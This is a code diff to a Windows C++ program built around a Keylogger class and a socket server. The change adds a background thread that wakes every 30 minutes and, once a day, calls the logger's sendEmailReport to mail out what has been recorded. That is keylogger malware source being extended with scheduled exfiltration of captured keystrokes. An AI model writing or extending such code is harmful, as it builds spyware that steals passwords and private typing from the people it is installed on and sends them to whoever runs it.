@@ -18,18 +18,25 @@
 #include <tchar.h>
 #include <windows.h>
 #include <stdio.h>
+#include <chrono>
+#include <ctime>
 
 #include "Keylogger.h"
 #include "SocketServer.h"
 
 extern "C" { FILE __iob_func[3] = { *stdin,*stdout,*stderr }; }
 
+#define SECONDS_IN_DAY 86400
+#define CHECK_TIME_INTERVAL 1800
+
 shared_ptr<Keylogger> logger;
 shared_ptr<SocketServer> socketServer;
+time_t prevEmailReportTime = 0;
 
 LRESULT CALLBACK WndProc(HWND hWnd, UINT message,
 	WPARAM wParam, LPARAM lParam);
 void socketThreadProc();
+void mailerThreadProc();
 
 INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
 	LPSTR lpCmdLine, INT iCmdShow) {
@@ -56,6 +63,7 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
 
 	socketServer = make_shared<SocketServer>(logger.get());
 	std::thread socketThread(socketThreadProc);
+	std::thread mailerThread(mailerThreadProc);
 	while (GetMessage(&msg, NULL, 0, 0)) {
 		DispatchMessage(&msg);
 	}
@@ -81,4 +89,23 @@ LRESULT CALLBACK WndProc(HWND hWnd, UINT message,
 
 void socketThreadProc() {
 	socketServer->start();
+}
+
+void mailerThreadProc() {
+	while (true) {
+		std::this_thread::sleep_for(std::chrono::seconds(CHECK_TIME_INTERVAL));
+		time_t currentTime = time(nullptr);
+
+		if (currentTime - prevEmailReportTime > SECONDS_IN_DAY) {
+			// Send email in setted up interval of time
+			std::cout << "hello" << std::endl;
+			bool result = logger->sendEmailReport(true);
+			if (result) {
+				prevEmailReportTime = currentTime;
+				std::cout << "ok";
+			} else {
+				std::cout << "error";
+			}
+		}
+	}
 }
